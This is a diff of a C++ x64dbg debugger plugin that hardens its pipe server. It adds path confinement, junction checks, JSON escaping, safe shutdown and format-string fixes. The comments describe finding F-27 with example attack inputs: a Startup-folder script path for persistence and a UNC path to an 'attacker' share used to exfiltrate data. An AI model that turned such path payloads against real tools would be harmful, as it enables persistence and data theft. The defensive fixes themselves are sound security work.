@@ -12,7 +12,11 @@
 #include <map>
 #include <algorithm>
 #include <cctype>
+#include <atomic>      // g_running / g_serverProcessId cross thread boundaries
+#include <cstring>
+#include <cstdlib>
 #include <wincrypt.h>  // For CryptGenRandom
+#include <sddl.h>      // For ConvertSidToStringSid / SDDL security descriptors
 
 // x64dbg SDK headers
 #include "pluginsdk/_plugins.h"
@@ -153,7 +157,31 @@ static HANDLE g_pipeServer = INVALID_HANDLE_VALUE;
 static HANDLE g_pipeThread = nullptr;
 static HANDLE g_shutdownEvent = nullptr;  // Event to signal shutdown
 static HANDLE g_pipeReadyEvent = nullptr;  // Event signaled when pipe is created
-static bool g_running = false;
+
+// g_running is written by pluginSetup/pluginStop (x64dbg's thread) and read by
+// PipeServerThread and by the wait handlers running on it. A plain `bool` gives
+// the compiler licence to hoist the load out of `while (g_running)`, so a
+// shutdown could be missed entirely and the loop would spin inside a DLL that
+// is about to be unloaded (see the F-20 comment on pluginStop). std::atomic
+// with the default seq_cst ordering costs nothing measurable at these poll
+// rates and makes the shutdown handshake actually observable.
+static std::atomic<bool> g_running{false};
+
+// PID of the obsidian_server.exe we spawned, recorded by SpawnHTTPServer and
+// read by PipeServerThread to authenticate the pipe peer (finding F-17). Zero
+// means "no server spawned yet", which must be treated as "reject everything".
+static std::atomic<DWORD> g_serverProcessId{0};
+
+// Serialises access to g_pipeServer between PipeServerThread (which owns and
+// is the ONLY closer of the handle) and pluginStop (which may only cancel I/O
+// on it). See the F-20 / handle-recycling comment on pluginStop.
+//
+// Initialised once from pluginInit(), which x64dbg calls on a single thread
+// before anything else in this plugin runs -- deliberately NOT lazily, because
+// a lazy "if (!initialised) InitializeCriticalSection(...)" is itself the race
+// it is trying to protect against.
+static CRITICAL_SECTION g_pipeHandleLock;
+static bool g_pipeHandleLockInit = false;
 
 // PHASE 4: TRACING & API LOGGING DATA STRUCTURES
 
@@ -298,7 +326,38 @@ void InitCoverageLock() {
 }
 
 // Logging helpers
-void LogInfo(const char* format, ...) {
+// ---------------------------------------------------------------------------
+// Format-string checking for the log wrappers (CWE-686 / MSVC C4477)
+//
+// These are variadic wrappers around vsnprintf, and MSVC applies its C4477
+// format/argument check only to the printf family it recognises. It therefore
+// could not see ANY call site here -- which is exactly how twenty
+// `%llx`-with-`duint` bugs survived: the identical mistake in a direct
+// snprintf() was flagged on the very first x86 build, while the same mistake
+// inside LogInfo() was silent.
+//
+// `duint` is 64-bit on x64 and 32-bit on x86, so `%llx` on the 32-bit build
+// read eight bytes where four were pushed: a garbage high dword AND every
+// following argument shifted. In a call like
+// LogInfo("... 0x%llx (type: %s)", address, str) that shift hands `%s` a
+// non-pointer -- a crash, not merely wrong output.
+//
+// _Printf_format_string_ is what MSVC offers here. Be precise about its reach:
+// it drives /analyze (and IntelliSense), NOT the ordinary compile, so it is a
+// documentation and static-analysis aid rather than a build-time gate. The
+// arguments are cast at the call sites for that reason -- the annotation alone
+// would not have caught these.
+//
+// SAL arrives via <sal.h>, which every MSVC CRT header pulls in through
+// <vcruntime.h> (so <cstdio> above is sufficient). The fallback below means a
+// toolchain without SAL still compiles: an annotation that documents intent
+// must never be the thing that breaks a build.
+// ---------------------------------------------------------------------------
+#ifndef _Printf_format_string_
+#define _Printf_format_string_
+#endif
+
+void LogInfo(_Printf_format_string_ const char* format, ...) {
     char buffer[1024];
     va_list args;
     va_start(args, format);
@@ -307,7 +366,7 @@ void LogInfo(const char* format, ...) {
     _plugin_logprintf("[MCP] %s\n", buffer);
 }
 
-void LogError(const char* format, ...) {
+void LogError(_Printf_format_string_ const char* format, ...) {
     char buffer[1024];
     va_list args;
     va_start(args, format);
@@ -319,6 +378,24 @@ void LogError(const char* format, ...) {
 // JSON HELPER FUNCTIONS (Simple parser - no external dependencies)
 
 // Escape string for JSON output (handles backslashes, quotes, newlines, etc.)
+//
+// AUDIT (JSON escaping / non-ASCII): every byte outside 0x20..0x7E is emitted
+// as a \u escape, not just the C0 controls.
+//
+// WHY: the strings that reach here are not the plugin's own -- they are module
+// paths, symbol names, debug strings and disassembly text lifted out of the
+// process under analysis, i.e. attacker-chosen bytes. x64dbg hands them over as
+// raw `char` with no declared encoding, so an 0x80..0xFF byte passed through
+// verbatim produces a JSON document that is not valid UTF-8. The Python side
+// calls response.json(); invalid UTF-8 raises there, so a single crafted module
+// name turns every subsequent response on that endpoint into an opaque decode
+// error -- a denial of service on the analysis session that the sample controls
+// for free. 0x7F (DEL) is escaped for the same reason.
+//
+// Escaping as \u00XX means a high byte round-trips as the U+0080..U+00FF code
+// point of the same value (a latin-1 reading of the byte). That is a lossy
+// guess about the encoding, but it is a REVERSIBLE and always-decodable one:
+// the consumer still sees the byte value, and the transport never breaks.
 std::string JsonEscape(const std::string& str) {
     std::string result;
     result.reserve(str.length() * 2);  // Preallocate for potential escaping
@@ -332,22 +409,35 @@ std::string JsonEscape(const std::string& str) {
             case '\t': result += "\\t"; break;
             case '\b': result += "\\b"; break;
             case '\f': result += "\\f"; break;
-            default:
-                // Handle control characters
-                if (static_cast<unsigned char>(c) < 0x20) {
+            default: {
+                unsigned char uc = static_cast<unsigned char>(c);
+                // Anything outside printable ASCII: control characters AND
+                // every byte >= 0x7F. See the comment above for why the high
+                // half cannot be passed through.
+                if (uc < 0x20 || uc >= 0x7F) {
                     char buf[8];
-                    snprintf(buf, sizeof(buf), "\\u%04x", static_cast<unsigned char>(c));
+                    snprintf(buf, sizeof(buf), "\\u%04x", uc);
                     result += buf;
                 } else {
                     result += c;
                 }
                 break;
+            }
         }
     }
     return result;
 }
 
 // Extract integer value from JSON string
+//
+// AUDIT (silent parse failure): this used to discard sscanf's return value, so
+// an unparseable value ("timeout":"abc", "timeout":null, a truncated request)
+// left `value` at its initialiser 0 and the function returned 0 instead of the
+// caller's defaultValue. That is not a cosmetic difference: every caller picked
+// its default deliberately, and 0 is frequently the WORST possible value for
+// the field -- `ExtractIntField(request, "type", -1)` would report request type
+// 0 rather than "absent", and the wait handlers would collapse their timeout.
+// Honour the conversion result and fall back to defaultValue on failure.
 int ExtractIntField(const std::string& json, const char* fieldName, int defaultValue = 0) {
     std::string searchStr = std::string("\"") + fieldName + "\":";
     size_t pos = json.find(searchStr);
@@ -355,9 +445,20 @@ int ExtractIntField(const std::string& json, const char* fieldName, int defaultV
 
     pos += searchStr.length();
     while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
+    if (pos >= json.length()) return defaultValue;
+
+    // JSON booleans reach integer fields all the time here, because several
+    // request fields are conceptually flags (trace_into, peek) and the Python
+    // side is free to send real booleans. Map them explicitly rather than
+    // letting them fail parsing and silently take the default -- "false" taking
+    // a default of 1 would invert the caller's intent.
+    if (json.compare(pos, 4, "true") == 0) return 1;
+    if (json.compare(pos, 5, "false") == 0) return 0;
 
     int value = 0;
-    sscanf(json.c_str() + pos, "%d", &value);
+    if (sscanf(json.c_str() + pos, "%d", &value) != 1) {
+        return defaultValue;
+    }
     return value;
 }
 
@@ -431,6 +532,289 @@ std::string BuildJsonResponse(bool success, const std::string& data = "") {
     response += "}";
     return response;
 }
+
+// ---------------------------------------------------------------------------
+// OUTPUT PATH CONFINEMENT -- finding F-27
+//
+// Two handlers used to take a filesystem path straight out of the request and
+// hand it to fopen(): EXPORT_COVERAGE ("file") and START_TRACE ("log_file").
+// There was no canonicalisation, no confinement and no extension check, which
+// made both of them an arbitrary file CREATE/OVERWRITE primitive running with
+// x64dbg's privileges:
+//
+//   "file": "C:\\Users\\me\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\
+//            Programs\\Startup\\x.cmd"   -> persistence
+//   "file": "\\\\attacker\\share\\loot.csv" -> a UNC target makes the WRITE an
+//            outbound network transfer, so the same bug is also an exfiltration
+//            channel, and it is the coverage data (i.e. what the sample did)
+//            that gets exfiltrated.
+//
+// Combined with F-17 (the pipe had no peer authentication) the process being
+// debugged could reach these handlers itself, so this was not merely "the
+// operator can overwrite their own files".
+//
+// The fix is confinement, not sanitisation: resolve the requested name against
+// one fixed output directory, canonicalise the result with GetFullPathNameA,
+// and then require the canonical result to still live under that directory.
+// Prefix-matching AFTER canonicalisation handles every LEXICAL trick ("..",
+// "....\\\\", a short 8.3 name, a trailing dot, a device name like CON which
+// GetFullPathNameA rewrites to \\.\CON), because anything that spells its way
+// out of the base no longer has the base as its prefix.
+//
+// It does NOT handle reparse points, and an earlier revision of this comment
+// wrongly claimed it handled everything. GetFullPathNameA is purely lexical --
+// it never touches the filesystem -- so a junction planted inside the output
+// root keeps the prefix intact while sending the write somewhere else entirely.
+// Since the root lives under %TEMP%, the debuggee can plant one. That is why
+// IsReparsePoint is applied to the root in GetOutputRoot and to every component
+// below it here. Three layers, none of them sufficient alone: the syntactic
+// rejections are a fast first pass, the prefix check is the lexical control,
+// and the reparse-point walk is the physical one.
+// ---------------------------------------------------------------------------
+
+// True if `path` exists AND is a reparse point (junction, directory symlink,
+// mount point). CWE-59.
+//
+// GetFullPathNameA, which the confinement below relies on, is a purely LEXICAL
+// function -- it never touches the filesystem and therefore never resolves a
+// reparse point. So a prefix comparison against a canonicalised string proves
+// only that the path SPELLS its way inside the root, not that it physically
+// lands there. Anything that can create a directory inside the root can
+// therefore redirect writes out of it, and the root lives under %TEMP%, which
+// is writable by every process running as this user -- the debuggee included.
+//
+// A path that does not exist yet is not a reparse point and is not a problem:
+// it will be created inside the root by the writer.
+//
+// GetFileAttributesA is kernel32, so this adds no new link dependency.
+static bool IsReparsePoint(const std::string& path) {
+    std::string probe = path;
+    // GetFileAttributes dislikes a trailing separator on some paths. Keep the
+    // one in "C:\" -- a bare drive root must stay "C:\".
+    while (probe.size() > 3 && probe.back() == '\\') {
+        probe.pop_back();
+    }
+    DWORD attrs = GetFileAttributesA(probe.c_str());
+    if (attrs == INVALID_FILE_ATTRIBUTES) {
+        return false;  // absent: nothing to follow
+    }
+    return (attrs & FILE_ATTRIBUTE_REPARSE_POINT) != 0;
+}
+
+// Returns the single directory that plugin-written files may live in, with a
+// trailing backslash. Created on demand.
+static bool GetOutputRoot(std::string& outRoot) {
+    outRoot.clear();
+
+    char tempPath[MAX_PATH];
+    DWORD n = GetTempPathA(MAX_PATH, tempPath);
+    if (n == 0 || n >= MAX_PATH) {
+        return false;
+    }
+
+    // CreateDirectoryA fails with ERROR_ALREADY_EXISTS when the name is taken,
+    // and that is normally fine -- but it is ALSO what happens when the name
+    // was pre-created as a junction. Ignoring the error unconditionally is what
+    // let a sample point the whole output tree somewhere else and have every
+    // later write follow it, with the lexical prefix check none the wiser. So
+    // each level is checked after creation and the whole root is refused if
+    // either is a reparse point.
+    std::string base = std::string(tempPath) + "obsidian_x64dbg\\";
+    CreateDirectoryA(base.c_str(), nullptr);  // ERROR_ALREADY_EXISTS is fine
+    if (IsReparsePoint(base)) {
+        return false;
+    }
+
+    std::string root = base + "output\\";
+    CreateDirectoryA(root.c_str(), nullptr);
+    if (IsReparsePoint(root)) {
+        return false;
+    }
+
+    // %TEMP% itself may be an 8.3 short path or contain a symlink component, so
+    // canonicalise the base too -- otherwise the prefix comparison below would
+    // be against a spelling the resolved child never matches.
+    char full[MAX_PATH];
+    DWORD len = GetFullPathNameA(root.c_str(), MAX_PATH, full, nullptr);
+    if (len == 0 || len >= MAX_PATH) {
+        return false;
+    }
+
+    outRoot = full;
+    if (outRoot.empty() || outRoot.back() != '\\') {
+        outRoot += '\\';
+    }
+    return true;
+}
+
+// Case-insensitive extension whitelist. `allowed` is a nullptr-terminated array
+// of lowercase extensions including the dot, e.g. {".csv", ".json", nullptr}.
+static bool HasAllowedExtension(const std::string& path, const char* const* allowed) {
+    size_t dot = path.find_last_of('.');
+    size_t sep = path.find_last_of('\\');
+    if (dot == std::string::npos) return false;
+    if (sep != std::string::npos && dot < sep) return false;  // dot is in a directory name
+
+    std::string ext = path.substr(dot);
+    for (size_t i = 0; i < ext.size(); i++) {
+        ext[i] = (char)tolower((unsigned char)ext[i]);
+    }
+    for (int i = 0; allowed[i] != nullptr; i++) {
+        if (ext == allowed[i]) return true;
+    }
+    return false;
+}
+
+// Resolve `requested` to an absolute path inside the output root, or fail.
+// On failure outError holds an already-JSON-safe explanation.
+static bool ResolveConfinedOutputPath(const std::string& requested,
+                                      const char* const* allowedExtensions,
+                                      std::string& outPath,
+                                      std::string& outError) {
+    outPath.clear();
+    outError.clear();
+
+    if (requested.empty()) {
+        outError = "Missing file path";
+        return false;
+    }
+    if (requested.size() >= MAX_PATH) {
+        outError = "File path too long";
+        return false;
+    }
+
+    // Control characters, wildcards and the NTFS stream separator never belong
+    // in a name we are about to create, and ':' additionally covers both drive
+    // letters ("C:\\...") and alternate data streams ("out.csv:hidden").
+    for (size_t i = 0; i < requested.size(); i++) {
+        unsigned char c = (unsigned char)requested[i];
+        // ':' is by far the most likely rejection in practice -- every real
+        // Windows path a caller types has a drive letter -- so it gets its own
+        // message. "File path contains an illegal character" told the analyst
+        // nothing about what to do instead, which made a deliberate
+        // confinement rule look like a malfunction.
+        if (c == ':') {
+            outError = "Drive letters and alternate data streams are not "
+                       "permitted; give a name relative to the plugin output "
+                       "directory, e.g. \"trace.csv\"";
+            return false;
+        }
+        if (c < 0x20 || c == 0x7F || c == '"' ||
+            c == '<' || c == '>' || c == '|' || c == '*' || c == '?') {
+            outError = "File path contains an illegal character";
+            return false;
+        }
+    }
+
+    // Normalise separators so the checks below only have to reason about '\\'.
+    std::string rel = requested;
+    for (size_t i = 0; i < rel.size(); i++) {
+        if (rel[i] == '/') rel[i] = '\\';
+    }
+
+    // A leading separator is either root-relative ("\\dir\\x") or UNC
+    // ("\\\\host\\share\\x"); both leave the output root.
+    if (rel[0] == '\\') {
+        outError = "Absolute and UNC paths are not permitted; give a name relative to the output directory";
+        return false;
+    }
+
+    // Reject ".." as a whole path component. Checking components rather than
+    // searching for the substring avoids rejecting a legitimate "v1..2.csv"
+    // while still catching "..\\..\\x" and "a\\..\\..\\x".
+    size_t start = 0;
+    while (start <= rel.size()) {
+        size_t end = rel.find('\\', start);
+        std::string component = (end == std::string::npos)
+                                    ? rel.substr(start)
+                                    : rel.substr(start, end - start);
+        if (component == "..") {
+            outError = "Parent-directory references are not permitted in the file path";
+            return false;
+        }
+        if (end == std::string::npos) break;
+        start = end + 1;
+    }
+
+    std::string root;
+    if (!GetOutputRoot(root)) {
+        outError = "Could not prepare the plugin output directory";
+        return false;
+    }
+
+    std::string joined = root + rel;
+    if (joined.size() >= MAX_PATH) {
+        outError = "File path too long";
+        return false;
+    }
+
+    char full[MAX_PATH];
+    DWORD len = GetFullPathNameA(joined.c_str(), MAX_PATH, full, nullptr);
+    if (len == 0 || len >= MAX_PATH) {
+        outError = "File path could not be resolved";
+        return false;
+    }
+    std::string canonical(full);
+
+    // THE control: whatever the input did, the canonical result must still sit
+    // under the output root. Windows paths are case-insensitive, so compare
+    // that way -- a case-sensitive compare here would be a bypass, not a
+    // hardening.
+    if (canonical.size() <= root.size() ||
+        _strnicmp(canonical.c_str(), root.c_str(), root.size()) != 0) {
+        outError = "File path escapes the plugin output directory";
+        return false;
+    }
+
+    // The prefix check above is LEXICAL, so it proves spelling, not location.
+    // Walk every component strictly below the root and refuse if any of them is
+    // an existing reparse point -- otherwise "sub\\trace.log", where "sub" was
+    // pre-created as a junction, spells its way inside the root and writes
+    // outside it. The final component is included on purpose: an existing
+    // symlinked FILE is followed by fopen(..., "w") just as happily.
+    //
+    // This is the same control src/utils/security.py::_reject_symlinked_components
+    // applies on the Python side; the C++ writer had no equivalent.
+    {
+        size_t pos = root.size();
+        while (true) {
+            size_t sep = canonical.find('\\', pos);
+            std::string component = (sep == std::string::npos)
+                                        ? canonical
+                                        : canonical.substr(0, sep);
+            if (IsReparsePoint(component)) {
+                outError = "File path passes through a junction or symlink, "
+                           "which could redirect the write outside the plugin "
+                           "output directory";
+                return false;
+            }
+            if (sep == std::string::npos) {
+                break;
+            }
+            pos = sep + 1;
+        }
+    }
+
+    // Extension whitelist last, on the CANONICAL path, so it cannot be dodged
+    // by anything GetFullPathNameA strips (trailing dots and spaces).
+    if (!HasAllowedExtension(canonical, allowedExtensions)) {
+        outError = "File extension is not permitted for this output";
+        return false;
+    }
+
+    outPath = canonical;
+    return true;
+}
+
+// Extensions each writer may produce. Executable/script extensions are absent
+// on purpose: a confined directory still should not become a drop point for
+// something another process might later run.
+static const char* const COVERAGE_OUTPUT_EXTENSIONS[] = {
+    ".csv", ".json", ".drcov", ".txt", ".log", nullptr
+};
+static const char* const TRACE_LOG_EXTENSIONS[] = {
+    ".txt", ".log", ".csv", nullptr
+};
 
 // Helper: Normalize symbol format to x64dbg's module!symbol format
 // Converts common formats like module.function or module::function
@@ -777,7 +1161,7 @@ std::string HandleSetBreakpoint(const std::string& request) {
 
     // Set breakpoint using resolved address
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "bp %llx", address);
+    snprintf(cmd, sizeof(cmd), "bp %llx", (unsigned long long)address);
 
     if (!DbgCmdExec(cmd)) {
         // Try to determine why it failed
@@ -791,7 +1175,7 @@ std::string HandleSetBreakpoint(const std::string& request) {
         return BuildJsonResponse(false, errData.str());
     }
 
-    LogInfo("Breakpoint set at 0x%llx", address);
+    LogInfo("Breakpoint set at 0x%llx", (unsigned long long)address);
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\"";
@@ -832,10 +1216,10 @@ std::string HandleDeleteBreakpoint(const std::string& request) {
     }
 
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "bc %llx", address);
+    snprintf(cmd, sizeof(cmd), "bc %llx", (unsigned long long)address);
     DbgCmdExec(cmd);
 
-    LogInfo("Breakpoint deleted at 0x%llx", address);
+    LogInfo("Breakpoint deleted at 0x%llx", (unsigned long long)address);
 
     std::stringstream data;
     data << "\"message\":\"Breakpoint deleted\","
@@ -944,7 +1328,7 @@ std::string HandleGetStack(const std::string& request) {
     if (count < 1) count = 1;
     if (count > 256) count = 256;
 
-    LogInfo("GetStack: RSP=0x%llx, RBP=0x%llx, RIP=0x%llx, count=%d", rsp, rbp, rip, count);
+    LogInfo("GetStack: RSP=0x%llx, RBP=0x%llx, RIP=0x%llx, count=%d", (unsigned long long)rsp, (unsigned long long)rbp, (unsigned long long)rip, count);
 
     std::stringstream data;
 
@@ -962,7 +1346,7 @@ std::string HandleGetStack(const std::string& request) {
         duint stackValue = 0;
 
         if (!DbgMemRead(stackAddr, &stackValue, sizeof(stackValue))) {
-            LogInfo("GetStack: Failed to read at 0x%llx", stackAddr);
+            LogInfo("GetStack: Failed to read at 0x%llx", (unsigned long long)stackAddr);
             break;
         }
 
@@ -1092,7 +1476,7 @@ std::string HandleWriteMemory(const std::string& request) {
         return BuildJsonResponse(false, "\"error\":\"Failed to write memory\"");
     }
 
-    LogInfo("Wrote %zu bytes to 0x%llx", bytes.size(), address);
+    LogInfo("Wrote %zu bytes to 0x%llx", bytes.size(), (unsigned long long)address);
 
     std::stringstream resultData;
     resultData << "\"bytes_written\":" << bytes.size();
@@ -1359,7 +1743,7 @@ std::string HandleSkipInstruction(const std::string& request) {
     // Set RIP/EIP to next instruction
     duint newCip = cip + instr.instr_size;
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "rip=%llx", newCip);
+    snprintf(cmd, sizeof(cmd), "rip=%llx", (unsigned long long)newCip);
     DbgCmdExec(cmd);
 
     std::stringstream data;
@@ -1410,12 +1794,12 @@ std::string HandleSetHardwareBreakpoint(const std::string& request) {
     else if (typeStr == "access") hwType = "a";
 
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "bph %llx, %s, %d", address, hwType.c_str(), size);
+    snprintf(cmd, sizeof(cmd), "bph %llx, %s, %d", (unsigned long long)address, hwType.c_str(), size);
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to set hardware breakpoint\"");
     }
 
-    LogInfo("Hardware breakpoint set at 0x%llx (type: %s, size: %d)", address, hwType.c_str(), size);
+    LogInfo("Hardware breakpoint set at 0x%llx (type: %s, size: %d)", (unsigned long long)address, hwType.c_str(), size);
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -1446,12 +1830,12 @@ std::string HandleSetMemoryBreakpoint(const std::string& request) {
     else if (typeStr == "write") memType = "w";
 
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "bpm %llx, %s", address, memType.c_str());
+    snprintf(cmd, sizeof(cmd), "bpm %llx, %s", (unsigned long long)address, memType.c_str());
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to set memory breakpoint\"");
     }
 
-    LogInfo("Memory breakpoint set at 0x%llx (type: %s)", address, memType.c_str());
+    LogInfo("Memory breakpoint set at 0x%llx (type: %s)", (unsigned long long)address, memType.c_str());
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -1474,10 +1858,10 @@ std::string HandleDeleteMemoryBreakpoint(const std::string& request) {
     }
 
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "bpmc %llx", address);
+    snprintf(cmd, sizeof(cmd), "bpmc %llx", (unsigned long long)address);
     DbgCmdExec(cmd);
 
-    LogInfo("Memory breakpoint deleted at 0x%llx", address);
+    LogInfo("Memory breakpoint deleted at 0x%llx", (unsigned long long)address);
     return BuildJsonResponse(true, "\"message\":\"Memory breakpoint deleted\"");
 }
 
@@ -1494,6 +1878,60 @@ std::string HandleHideDebugger(const std::string& request) {
 }
 
 // WAIT/SYNCHRONIZATION HANDLERS (Phase 1)
+//
+// ---------------------------------------------------------------------------
+// Finding F-20 -- plugin-image use-after-free on unload.
+//
+// These three handlers run on PipeServerThread and poll for up to five minutes
+// on a caller-supplied timeout. They used to poll with a bare Sleep(50) and
+// consult nothing but the debugger state, so once one was entered NOTHING could
+// get it out early. Meanwhile pluginStop() waited 1000 ms for the pipe thread
+// and then returned regardless, at which point x64dbg FreeLibrary()s this DLL --
+// while a thread is still executing inside its .text and touching its globals.
+// That is a use-after-free of the entire plugin image: the next instruction the
+// thread retires is whatever the loader has since mapped there. A request as
+// ordinary as {"type":91,"timeout":300000} sent just before x64dbg exits was
+// enough to arm it.
+//
+// The fix is a shutdown handshake with two halves, and BOTH are required:
+//   1. here -- the poll sleep becomes WaitForSingleObject(g_shutdownEvent, ...)
+//      so pluginStop can pull these loops out immediately, and the loop
+//      condition also checks g_running; and
+//   2. in pluginStop -- it now waits long enough for that to actually happen,
+//      and if the thread still has not exited it PINS the module rather than
+//      letting the unload proceed. See the comment there.
+//
+// AbortableSleep returns true if it slept the full interval, false if shutdown
+// was signalled (or the event is unusable, which is also a reason to stop).
+// ---------------------------------------------------------------------------
+static bool AbortableSleep(DWORD milliseconds) {
+    if (!g_running.load()) {
+        return false;
+    }
+    HANDLE shutdown = g_shutdownEvent;
+    if (!shutdown) {
+        // No event to wait on: fall back to a plain sleep so behaviour is
+        // unchanged, but still honour g_running on the next loop iteration.
+        Sleep(milliseconds);
+        return g_running.load();
+    }
+    DWORD waitResult = WaitForSingleObject(shutdown, milliseconds);
+    // WAIT_TIMEOUT is the ONLY result that means "keep waiting". WAIT_OBJECT_0
+    // is shutdown; WAIT_FAILED/WAIT_ABANDONED mean the handle can no longer be
+    // trusted, and continuing to spin on a broken handle inside a DLL that is
+    // being torn down is exactly the failure mode F-20 describes.
+    return waitResult == WAIT_TIMEOUT && g_running.load();
+}
+
+// Shared body for the F-20 early-exit reply, so all three handlers report the
+// abort identically instead of pretending the wait simply timed out.
+static std::string BuildWaitAbortedResponse(long long elapsedMs) {
+    std::stringstream data;
+    data << "\"error\":\"Wait aborted: plugin is shutting down\","
+         << "\"aborted\":true,"
+         << "\"elapsed_ms\":" << elapsedMs;
+    return BuildJsonResponse(false, data.str());
+}
 
 // Handler: WAIT_PAUSED - Wait until debugger is paused
 std::string HandleWaitPaused(const std::string& request) {
@@ -1536,8 +1974,11 @@ std::string HandleWaitPaused(const std::string& request) {
             return BuildJsonResponse(false, data.str());
         }
 
-        // Sleep before next check
-        Sleep(pollInterval);
+        // F-20: abortable poll. Returning here is what lets pluginStop finish
+        // before x64dbg unloads the DLL this code lives in.
+        if (!AbortableSleep((DWORD)pollInterval)) {
+            return BuildWaitAbortedResponse(elapsed);
+        }
     }
 }
 
@@ -1579,7 +2020,10 @@ std::string HandleWaitRunning(const std::string& request) {
             return BuildJsonResponse(false, data.str());
         }
 
-        Sleep(pollInterval);
+        // F-20: abortable poll -- see AbortableSleep.
+        if (!AbortableSleep((DWORD)pollInterval)) {
+            return BuildWaitAbortedResponse(elapsed);
+        }
     }
 }
 
@@ -1622,7 +2066,10 @@ std::string HandleWaitDebugging(const std::string& request) {
             return BuildJsonResponse(false, data.str());
         }
 
-        Sleep(pollInterval);
+        // F-20: abortable poll -- see AbortableSleep.
+        if (!AbortableSleep((DWORD)pollInterval)) {
+            return BuildWaitAbortedResponse(elapsed);
+        }
     }
 }
 
@@ -1707,8 +2154,11 @@ std::string HandleGetModuleImports(const std::string& request) {
 
     // Note: Full import enumeration requires more complex PE parsing
     // For now, return basic info
+    // JsonEscape: `module` is echoed straight back from the request, so an
+    // unescaped quote or backslash in it produced a malformed response body --
+    // every other field in this file is escaped and these two were missed.
     std::stringstream data;
-    data << "\"module\":\"" << moduleName << "\","
+    data << "\"module\":\"" << JsonEscape(moduleName) << "\","
          << "\"base\":\"" << std::hex << modBase << std::dec << "\","
          << "\"imports\":[]";  // TODO: Implement full import enumeration
 
@@ -1734,8 +2184,9 @@ std::string HandleGetModuleExports(const std::string& request) {
 
     // Note: Full export enumeration requires more complex PE parsing
     // For now, return basic info
+    // JsonEscape for the same reason as HandleGetModuleImports above.
     std::stringstream data;
-    data << "\"module\":\"" << moduleName << "\","
+    data << "\"module\":\"" << JsonEscape(moduleName) << "\","
          << "\"base\":\"" << std::hex << modBase << std::dec << "\","
          << "\"exports\":[]";  // TODO: Implement full export enumeration
 
@@ -1799,7 +2250,7 @@ std::string HandleVirtAlloc(const std::string& request) {
     // Format: alloc size [, address]
     char cmd[256];
     if (preferredAddr != 0) {
-        snprintf(cmd, sizeof(cmd), "alloc %d, %llx", size, preferredAddr);
+        snprintf(cmd, sizeof(cmd), "alloc %d, %llx", size, (unsigned long long)preferredAddr);
     } else {
         snprintf(cmd, sizeof(cmd), "alloc %d", size);
     }
@@ -1815,7 +2266,7 @@ std::string HandleVirtAlloc(const std::string& request) {
         return BuildJsonResponse(false, "\"error\":\"VirtualAllocEx returned NULL\"");
     }
 
-    LogInfo("Allocated %d bytes at 0x%llx", size, allocatedAddr);
+    LogInfo("Allocated %d bytes at 0x%llx", size, (unsigned long long)allocatedAddr);
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << allocatedAddr << std::dec << "\","
@@ -1844,13 +2295,13 @@ std::string HandleVirtFree(const std::string& request) {
 
     // Use free command
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "free %llx", address);
+    snprintf(cmd, sizeof(cmd), "free %llx", (unsigned long long)address);
 
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to free memory\"");
     }
 
-    LogInfo("Freed memory at 0x%llx", address);
+    LogInfo("Freed memory at 0x%llx", (unsigned long long)address);
     return BuildJsonResponse(true, "\"message\":\"Memory freed\"");
 }
 
@@ -1901,13 +2352,13 @@ std::string HandleVirtProtect(const std::string& request) {
 
     // Use setpagerights command (x64dbg specific)
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "setpagerights %llx, %d, %x", address, size, protection);
+    snprintf(cmd, sizeof(cmd), "setpagerights %llx, %d, %x", (unsigned long long)address, size, protection);
 
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to change memory protection\"");
     }
 
-    LogInfo("Changed protection at 0x%llx to 0x%x", address, protection);
+    LogInfo("Changed protection at 0x%llx to 0x%x", (unsigned long long)address, protection);
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -1950,7 +2401,7 @@ std::string HandleMemSet(const std::string& request) {
         return BuildJsonResponse(false, "\"error\":\"Failed to write memory\"");
     }
 
-    LogInfo("Filled %d bytes at 0x%llx with 0x%02x", size, address, value & 0xFF);
+    LogInfo("Filled %d bytes at 0x%llx with 0x%02x", size, (unsigned long long)address, value & 0xFF);
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -2009,16 +2460,16 @@ std::string HandleToggleBreakpoint(const std::string& request) {
     // Use bpe (breakpoint enable) or bpd (breakpoint disable)
     char cmd[256];
     if (enable) {
-        snprintf(cmd, sizeof(cmd), "bpe %llx", address);
+        snprintf(cmd, sizeof(cmd), "bpe %llx", (unsigned long long)address);
     } else {
-        snprintf(cmd, sizeof(cmd), "bpd %llx", address);
+        snprintf(cmd, sizeof(cmd), "bpd %llx", (unsigned long long)address);
     }
 
     if (!DbgCmdExec(cmd)) {
         return BuildJsonResponse(false, "\"error\":\"Failed to toggle breakpoint\"");
     }
 
-    LogInfo("Breakpoint at 0x%llx %s", address, enable ? "enabled" : "disabled");
+    LogInfo("Breakpoint at 0x%llx %s", (unsigned long long)address, enable ? "enabled" : "disabled");
 
     std::stringstream data;
     data << "\"address\":\"" << std::hex << address << std::dec << "\","
@@ -2046,10 +2497,10 @@ std::string HandleDeleteHardwareBreakpoint(const std::string& request) {
     }
 
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "bphc %llx", address);
+    snprintf(cmd, sizeof(cmd), "bphc %llx", (unsigned long long)address);
     DbgCmdExec(cmd);
 
-    LogInfo("Hardware breakpoint deleted at 0x%llx", address);
+    LogInfo("Hardware breakpoint deleted at 0x%llx", (unsigned long long)address);
